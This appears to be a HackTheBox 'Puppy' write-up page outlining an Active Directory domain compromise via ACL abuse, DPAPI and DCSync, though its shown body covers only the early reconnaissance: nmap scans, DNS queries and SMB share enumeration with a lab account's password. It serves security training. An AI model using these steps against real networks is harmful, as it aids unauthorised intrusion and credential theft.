@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="preload" href="/assets/fonts/oxanium-variable.ttf" as="font" type="font/ttf" crossorigin />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+    
+    
+    <meta name="author" content="Gianluca Bassani" />
+
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    <!-- Single Page App redirect receiver for GitHub Pages -->
+    <script type="text/javascript">
+      (function(l) {
+        if (l.search[1] === '/' ) {
+          var decoded = l.search.slice(1).split('&').map(function(s) { 
+            return s.replace(/~and~/g, '&')
+          }).join('?');
+          window.history.replaceState(null, null,
+              l.pathname.slice(0, -1) + decoded + l.hash
+          );
+        }
+      }(window.location))
+    </script>
+    <script type="module" crossorigin src="/assets/index-Bt1iUacl.js"></script>
+    <link rel="stylesheet" crossorigin href="/assets/index-BFjX5Hv_.css">
+  
+    <link rel="stylesheet" href="/assets/ArticlePage-BEHUn5zE.css" />
+    <title>Puppy | Gianluca Bassani</title>
+    <meta name="description" content="Compromised an Active Directory domain controller by exploiting weak secrets management, abusing overly permissive ACLs, and leveraging DPAPI to recover high-privilege credentials, culminating in a full domain compromise via a DCSync attack." />
+    <link rel="canonical" href="https://gianlucabassani.gitlab.io/boxes/hackthebox/puppy/" />
+    <meta property="og:title" content="Puppy | Gianluca Bassani" />
+    <meta property="og:description" content="Compromised an Active Directory domain controller by exploiting weak secrets management, abusing overly permissive ACLs, and leveraging DPAPI to recover high-privilege credentials, culminating in a full domain compromise via a DCSync attack." />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://gianlucabassani.gitlab.io/boxes/hackthebox/puppy/" />
+    <meta property="og:site_name" content="Gianluca Bassani" />
+    <meta property="og:image" content="https://gianlucabassani.gitlab.io/assets/previews/writeup-puppy.png" />
+    <meta property="og:image:alt" content="Puppy | Gianluca Bassani" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="article:published_time" content="2025-09-16" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Puppy | Gianluca Bassani" />
+    <meta name="twitter:description" content="Compromised an Active Directory domain controller by exploiting weak secrets management, abusing overly permissive ACLs, and leveraging DPAPI to recover high-privilege credentials, culminating in a full domain compromise via a DCSync attack." />
+    <meta name="twitter:image" content="https://gianlucabassani.gitlab.io/assets/previews/writeup-puppy.png" />
+    <meta name="twitter:image:alt" content="Puppy | Gianluca Bassani" />
+</head>
+
+  <body>
+    <div id="root"><a class="skip-link" href="#route-content">Skip to content</a><div role="region" aria-label="Notifications (F8)" tabindex="-1" style="pointer-events:none"><ol tabindex="-1" class="fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]"></ol></div><header class="site-navigation"><svg class="site-navigation-frame site-navigation-frame-desktop" viewBox="0 0 1200 88" preserveAspectRatio="none" aria-hidden="true"><path class="site-navigation-surface" d="M20 1H1167L1199 25V69H440L422 87H1V20Z"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-3;--trace-next:-40;--trace-last:-74;stroke-dasharray:2.8 97.2;animation-duration:8.3s;animation-delay:-2.1s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-17;--trace-next:-54;--trace-last:-88;stroke-dasharray:1.4 98.6;animation-duration:11.7s;animation-delay:-7.6s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:270 90% 78%;--trace-start:-31;--trace-next:-68;--trace-last:-2;stroke-dasharray:3.6 96.4;animation-duration:9.1s;animation-delay:-4.8s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-44;--trace-next:-81;--trace-last:-15;stroke-dasharray:1.8 98.2;animation-duration:13.3s;animation-delay:-9.2s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-53;--trace-next:-90;--trace-last:-24;stroke-dasharray:2.4 97.6;animation-duration:7.7s;animation-delay:-1.3s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:270 90% 78%;--trace-start:-66;--trace-next:-3;--trace-last:-37;stroke-dasharray:3.2 96.8;animation-duration:10.9s;animation-delay:-6.4s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-78;--trace-next:-15;--trace-last:-49;stroke-dasharray:1.2 98.8;animation-duration:12.7s;animation-delay:-3.5s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-88;--trace-next:-25;--trace-last:-59;stroke-dasharray:2.1 97.9;animation-duration:9.7s;animation-delay:-8.1s"></path></svg><svg class="site-navigation-frame site-navigation-frame-mobile" viewBox="0 0 400 82" preserveAspectRatio="none" aria-hidden="true"><path class="site-navigation-surface" d="M10 1H389L399 11V73L391 81H1V10Z"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-3;--trace-next:-40;--trace-last:-74;stroke-dasharray:2.8 97.2;animation-duration:8.3s;animation-delay:-2.1s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-17;--trace-next:-54;--trace-last:-88;stroke-dasharray:1.4 98.6;animation-duration:11.7s;animation-delay:-7.6s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:270 90% 78%;--trace-start:-31;--trace-next:-68;--trace-last:-2;stroke-dasharray:3.6 96.4;animation-duration:9.1s;animation-delay:-4.8s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-44;--trace-next:-81;--trace-last:-15;stroke-dasharray:1.8 98.2;animation-duration:13.3s;animation-delay:-9.2s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-53;--trace-next:-90;--trace-last:-24;stroke-dasharray:2.4 97.6;animation-duration:7.7s;animation-delay:-1.3s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:270 90% 78%;--trace-start:-66;--trace-next:-3;--trace-last:-37;stroke-dasharray:3.2 96.8;animation-duration:10.9s;animation-delay:-6.4s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-78;--trace-next:-15;--trace-last:-49;stroke-dasharray:1.2 98.8;animation-duration:12.7s;animation-delay:-3.5s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-88;--trace-next:-25;--trace-last:-59;stroke-dasharray:2.1 97.9;animation-duration:9.7s;animation-delay:-8.1s"></path></svg><div class="site-navigation-inner"><a class="site-brand" aria-label="Gianluca Bassani home" href="/"><span class="site-brand-copy"><span class="site-brand-name">Gianluca<span class="site-brand-break"><br/></span> Bassani</span><small><strong>0xPr1m3</strong><span class="site-brand-separator" aria-hidden="true">·</span><span class="site-brand-role">Cybersecurity</span></small></span></a><button class="site-menu-toggle" type="button" aria-controls="site-menu" aria-expanded="false" aria-label="Open navigation"><svg xmlns="http://www.w3.org/2000/svg" width="21" height="21" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-menu"><line x1="4" x2="20" y1="12" y2="12"></line><line x1="4" x2="20" y1="6" y2="6"></line><line x1="4" x2="20" y1="18" y2="18"></line></svg></button><nav id="site-menu" aria-label="Main navigation" class="site-menu"><a href="/about">About Me</a><a href="/projects">Projects</a><a href="/blog">Blog</a><a aria-current="page" href="/boxes">Box Writeups</a><a href="/ctf">CTF Solves</a><a href="/skills">Skills</a><a class="site-console-link" href="/terminal">CLI <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-up-right" aria-hidden="true"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a></nav></div></header><div id="route-content" tabindex="-1"><!--$--><div class="min-h-screen bg-background cyber-grid reader-page relative"><div aria-hidden="true" class="page-ambient page-ambient-scattered" style="--ambient-primary:hsl(152,75%,52%);--ambient-secondary:hsl(185,95%,48%);--ambient-tertiary:hsl(152,75%,52%)"></div><div class="fixed top-0 left-0 w-full h-1 bg-muted z-50"><div class="h-full transition-all duration-100" style="width:0%;background-image:var(--gradient-green)"></div></div><div class="bg-background/80 backdrop-blur-md border-b border-border relative z-10"><div class="reader-header mx-auto px-4 py-4"><div class="article-navigation"><nav aria-label="Article navigation"><a class="site-button inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm font-medium disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 site-button-outline min-h-11 px-4 py-2 article-back-link" data-size="default" href="/"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-left" aria-hidden="true"><path d="m12 19-7-7 7-7"></path><path d="M19 12H5"></path></svg>Back to Home</a></nav><div class="article-reading-tools"><span><svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clock" aria-hidden="true"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>5<!-- --> min read</span><button type="button"><svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-link" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>Copy link</button><span role="status"></span></div></div><div class="flex flex-wrap items-center gap-x-4 gap-y-2 mb-4"><div class="inline-flex items-center rounded-full border px-2.5 py-0.5 text-xs font-semibold transition-colors focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 hover:bg-secondary/15 tag bg-warning/20 border-warning/40 text-warning">MEDIUM</div><img class="machine-icon" src="/assets/htb/puppy.png" alt="Puppy machine icon" width="48" height="48"/><span class="text-sm text-muted-foreground font-mono">HACKTHEBOX</span></div><h1 class="text-2xl sm:text-3xl font-display font-bold reader-title mb-2 tracking-tight">Puppy</h1><div class="flex flex-wrap items-center gap-x-4 gap-y-2 text-sm text-muted-foreground"><div class="flex items-center gap-1"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-calendar w-4 h-4"><path d="M8 2v4"></path><path d="M16 2v4"></path><rect width="18" height="18" x="3" y="4" rx="2"></rect><path d="M3 10h18"></path></svg>16 Sept 2025</div><div class="flex items-center gap-1"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-shield w-4 h-4"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path></svg>windows<!-- --> machine</div></div></div></div><main id="main-content" class="reader-layout reader-container mx-auto relative z-10 " tabindex="-1"><aside class="reader-sidebar"><div class="reader-toc reader-toc-desktop"><p>On this page</p><nav aria-label="Article chapters"><a href="#section-initial-enumeration" class="">Initial Enumeration</a><a href="#section-1-external-enumeration" class="">1. External Enumeration</a><a href="#section-tcp-scans" class="reader-toc-subsection">TCP Scans</a><a href="#section-2-services-analysis" class="">2. Services Analysis</a><a href="#section-dns-enumeration" class="reader-toc-subsection">DNS Enumeration</a><a href="#section-smb-enumeration" class="reader-toc-subsection">SMB Enumeration</a><a href="#section-ldap-enumeration" class="reader-toc-subsection">LDAP Enumeration</a><a href="#section-rpc-client-enumeration" class="reader-toc-subsection">RPC Client Enumeration</a><a href="#section-3-automated-enumeration" class="">3. Automated Enumeration</a><a href="#section-enum4linux-summary" class="reader-toc-subsection">Enum4Linux Summary</a><a href="#section-time-sync-bloodhound-mapping" class="reader-toc-subsection">Time Sync &amp; BloodHound Mapping</a><a href="#section-dev-share-access-keepass" class="reader-toc-subsection">DEV Share Access &amp; KeePass</a><a href="#section-smb-login-validation" class="reader-toc-subsection">SMB Login Validation</a><a href="#section-4-account-takeover-smbad-exploitation" class="">4. Account Takeover &amp; SMB/AD Exploitation</a><a href="#section-outbound-object-control-via-bloodhound" class="reader-toc-subsection">Outbound Object Control via BloodHound</a><a href="#section-ad-account-password-reset-adamsilver" class="reader-toc-subsection">AD Account Password Reset (ADAM.SILVER)</a><a href="#section-enable-adamsilver-via-ldif" class="reader-toc-subsection">Enable ADAM.SILVER via LDIF</a><a href="#section-initial-foothold-via-evil-winrm" class="reader-toc-subsection">Initial Foothold via Evil-WinRM</a><a href="#section-privileges-esaclation" class="">Privileges Esaclation</a><a href="#section-local-windows-machine-pillaging" class="reader-toc-subsection">Local Windows Machine Pillaging</a><a href="#section-backup-recon-and-secret-harvesting" class="reader-toc-subsection">Backup Recon and Secret Harvesting</a><a href="#section-login-as-stephcooper" class="">Login as steph.cooper</a><a href="#section-winpeas-findings" class="reader-toc-subsection">winPEAS Findings</a><a href="#section-dpapi-masterkey-extraction-and-decryption" class="">DPAPI / Masterkey Extraction and Decryption</a><a href="#section-decrypt-the-key" class="reader-toc-subsection">Decrypt the key</a><a href="#section-domain-admin-takeover" class="">Domain Admin Takeover</a><a href="#section-bloodhound-enumeration" class="reader-toc-subsection">BloodHound Enumeration</a><a href="#section-dcsync-execution" class="reader-toc-subsection">DCSync Execution</a><a href="#section-final-access-as-domain-admin" class="reader-toc-subsection">Final Access as Domain Admin</a><a href="#section-pass-the-hash" class="reader-toc-subsection">Pass-the-hash</a><a href="#section-conclusions" class="">Conclusions</a></nav></div><details class="reader-toc reader-toc-mobile"><summary>On this page <span>31<!-- --> chapters</span></summary><nav aria-label="Article chapters"><a href="#section-initial-enumeration" class="">Initial Enumeration</a><a href="#section-1-external-enumeration" class="">1. External Enumeration</a><a href="#section-tcp-scans" class="reader-toc-subsection">TCP Scans</a><a href="#section-2-services-analysis" class="">2. Services Analysis</a><a href="#section-dns-enumeration" class="reader-toc-subsection">DNS Enumeration</a><a href="#section-smb-enumeration" class="reader-toc-subsection">SMB Enumeration</a><a href="#section-ldap-enumeration" class="reader-toc-subsection">LDAP Enumeration</a><a href="#section-rpc-client-enumeration" class="reader-toc-subsection">RPC Client Enumeration</a><a href="#section-3-automated-enumeration" class="">3. Automated Enumeration</a><a href="#section-enum4linux-summary" class="reader-toc-subsection">Enum4Linux Summary</a><a href="#section-time-sync-bloodhound-mapping" class="reader-toc-subsection">Time Sync &amp; BloodHound Mapping</a><a href="#section-dev-share-access-keepass" class="reader-toc-subsection">DEV Share Access &amp; KeePass</a><a href="#section-smb-login-validation" class="reader-toc-subsection">SMB Login Validation</a><a href="#section-4-account-takeover-smbad-exploitation" class="">4. Account Takeover &amp; SMB/AD Exploitation</a><a href="#section-outbound-object-control-via-bloodhound" class="reader-toc-subsection">Outbound Object Control via BloodHound</a><a href="#section-ad-account-password-reset-adamsilver" class="reader-toc-subsection">AD Account Password Reset (ADAM.SILVER)</a><a href="#section-enable-adamsilver-via-ldif" class="reader-toc-subsection">Enable ADAM.SILVER via LDIF</a><a href="#section-initial-foothold-via-evil-winrm" class="reader-toc-subsection">Initial Foothold via Evil-WinRM</a><a href="#section-privileges-esaclation" class="">Privileges Esaclation</a><a href="#section-local-windows-machine-pillaging" class="reader-toc-subsection">Local Windows Machine Pillaging</a><a href="#section-backup-recon-and-secret-harvesting" class="reader-toc-subsection">Backup Recon and Secret Harvesting</a><a href="#section-login-as-stephcooper" class="">Login as steph.cooper</a><a href="#section-winpeas-findings" class="reader-toc-subsection">winPEAS Findings</a><a href="#section-dpapi-masterkey-extraction-and-decryption" class="">DPAPI / Masterkey Extraction and Decryption</a><a href="#section-decrypt-the-key" class="reader-toc-subsection">Decrypt the key</a><a href="#section-domain-admin-takeover" class="">Domain Admin Takeover</a><a href="#section-bloodhound-enumeration" class="reader-toc-subsection">BloodHound Enumeration</a><a href="#section-dcsync-execution" class="reader-toc-subsection">DCSync Execution</a><a href="#section-final-access-as-domain-admin" class="reader-toc-subsection">Final Access as Domain Admin</a><a href="#section-pass-the-hash" class="reader-toc-subsection">Pass-the-hash</a><a href="#section-conclusions" class="">Conclusions</a></nav></details></aside><div class="reader-body"><section class="reader-summary" aria-label="Article introduction"><p class="reader-summary-text">Compromised an Active Directory domain controller by exploiting weak secrets management, abusing overly permissive ACLs, and leveraging DPAPI to recover high-privilege credentials, culminating in a full domain compromise via a DCSync attack.</p><ul class="reader-summary-topics" aria-label="Topics"><li>Active Directory</li><li>SMB</li><li>KeePass</li><li>DPAPI</li><li>DCSync</li></ul></section><div style="--hover-theme:var(--theme-green)" class="rounded-lg border bg-card text-card-foreground shadow-sm relative overflow-hidden reader-article theme-green border-success/20"><div class="p-6 pt-0 reader-content"><div class="prose prose-invert prose-green reader-prose"><h2 id="section-initial-enumeration"><a href="#section-initial-enumeration" class="heading-link">Initial Enumeration</a></h2>
+<hr/>
+<h2 id="section-1-external-enumeration"><a href="#section-1-external-enumeration" class="heading-link">1. External Enumeration</a></h2>
+<h3 id="section-tcp-scans"><a href="#section-tcp-scans" class="heading-link">TCP Scans</a></h3>
+<h4 id="section-fast-scan-overview"><a href="#section-fast-scan-overview" class="heading-link">Fast Scan Overview</a></h4>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">nmap puppy.htb -Pn -F -T5
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+111/tcp  open  rpcbind
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+2049/tcp open  nfs
+</code></pre></div>
+<p>Standard Windows AD/DC ports detected: DNS, Kerberos, LDAP, SMB, NFS.</p>
+<p>Target likely an Active Directory domain controller.</p>
+<hr/>
+<h4 id="section-detailed-tcp-scan"><a href="#section-detailed-tcp-scan" class="heading-link">Detailed TCP Scan</a></h4>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash"><span class="hljs-built_in">sudo</span> nmap 10.10.11.70 -sV -sC -T4 -p- -Pn --open -oN nmap_full_TCP.txt
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class="hljs-keyword">time</span>: 2025-09-13 21:27:42Z)
+111/tcp   open  rpcbind       2-4 (RPC <span class="hljs-comment">#100000)</span>
+&lt;SNIP&gt;
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+2049/tcp  open  nlockmgr      1-4 (RPC <span class="hljs-comment">#100021)</span>
+3260/tcp  open  iscsi?
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Global Catalog)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+&lt;SNIP&gt;
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+|_clock-skew: 7h00m00s
+| smb2-time:
+|   <span class="hljs-built_in">date</span>: 2025-09-13T21:29:32
+|_  start_date: N/A
+</code></pre></div>
+<p>Full TCP scan confirms Windows domain controller with SMB signing required.</p>
+<p>Many standard AD services exposed: LDAP, Kerberos, SMB, HTTP endpoints.</p>
+<p>Clock skew observed (7h).</p>
+<hr/>
+<h2 id="section-2-services-analysis"><a href="#section-2-services-analysis" class="heading-link">2. Services Analysis</a></h2>
+<h3 id="section-dns-enumeration"><a href="#section-dns-enumeration" class="heading-link">DNS Enumeration</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">dig axfr puppy.htb @10.10.11.70
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">; Transfer failed.
+</code></pre></div>
+<p>Zone transfer not allowed.</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">dig txt puppy.htb @10.10.11.70
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">;; AUTHORITY SECTION:
+puppy.htb. 3600 IN SOA dc.puppy.htb. hostmaster.puppy.htb. 176 900 600 86400 3600
+</code></pre></div>
+<p>TXT query confirms authoritative SOA record and DC hostname.</p>
+<hr/>
+<h3 id="section-smb-enumeration"><a href="#section-smb-enumeration" class="heading-link">SMB Enumeration</a></h3>
+<h4 id="section-anonymous-access-check"><a href="#section-anonymous-access-check" class="heading-link">Anonymous Access Check</a></h4>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">smbclient -L \\puppy.htb -N
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">Anonymous login successful
+        Sharename       Type      Comment
+        ---------       ----      -------
+SMB1 disabled -- no workgroup available
+</code></pre></div>
+<p>Anonymous login allowed, but no SMB1 shares available.</p>
+<h4 id="section-authenticated-share-enumeration"><a href="#section-authenticated-share-enumeration" class="heading-link">Authenticated Share Enumeration</a></h4>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">smbmap -H puppy.htb -u <span class="hljs-string">&#x27;levi.james&#x27;</span> -p <span class="hljs-string">&#x27;KingofAkron2025!&#x27;</span>
+</code></pre></div>
